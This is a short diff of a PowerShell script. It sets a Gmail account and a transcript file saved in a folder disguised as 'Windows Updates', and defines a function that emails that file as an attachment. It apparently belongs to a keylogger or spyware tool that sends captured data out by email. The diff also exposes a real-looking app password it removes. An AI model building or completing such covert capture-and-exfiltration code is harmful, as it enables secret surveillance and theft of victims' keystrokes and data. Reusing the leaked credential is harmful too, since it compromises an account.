@@ -1,6 +1,6 @@
 
 $Username = "orapajelmar@gmail.com";
-$Password = "glideqcaaqbxqxru";
+$Password = "Enter App Password Here";
 $path = "$($env:USERPROFILE)\Desktop\Windows Updates\Transcript.txt";
 
 function Send-ToEmail([string]$email, [string]$attachmentpath){
